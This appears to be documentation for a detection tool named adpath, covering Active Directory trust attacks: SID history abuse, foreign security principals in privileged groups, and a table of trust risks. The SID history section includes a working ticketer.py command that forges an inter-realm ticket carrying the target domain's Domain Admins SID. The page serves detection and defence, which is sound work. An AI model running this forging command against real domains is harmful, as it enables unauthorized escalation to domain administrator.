# Trust Attacks

**MITRE:** T1482, T1134.005

## SID History Abuse

When SID filtering is disabled on an external or cross-forest trust, an attacker who controls the trusted domain can forge inter-realm TGTs containing arbitrary SIDs in the PAC — including the SID of Domain Admins in the trusting domain.

```bash
# Forge inter-realm TGT with DA SID of the target domain in PAC
ticketer.py -nthash <trust_key> \
  -domain trusted.local \
  -domain-sid <SID_of_trusted.local> \
  -extra-sid <DA_SID_of_corp.local> \
  -spn krbtgt/corp.local administrator
```

## Foreign Security Principals (FSPs)

Accounts from trusted external domains can be added to local AD groups. If an FSP is a member of Domain Admins or Administrators, compromising the external domain grants privilege in the local domain — directly, without any exploitation.

## Trust types and risk

| Direction | SID Filtering | Risk |
|-----------|---------------|------|
| Bidirectional external | OFF | Critical — attacker in either domain can escalate in the other |
| Any external | OFF | High — SID history abuse possible |
| Bidirectional forest | ON | Medium — forest boundary is a weaker isolation than external |
| Within-forest (parent-child) | N/A (Internal) | Normal — by design, SID filtering not applied within a forest |

## Detection with adpath

```bash
adpath trust -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```

adpath detects:

- All `trustedDomain` objects with direction, type, and SID filtering status
- Bidirectional and SID-filtering-off trusts with risk assessment
- RC4-only trust encryption (weaker, susceptible to trust key attacks)
- Foreign Security Principals in privileged groups
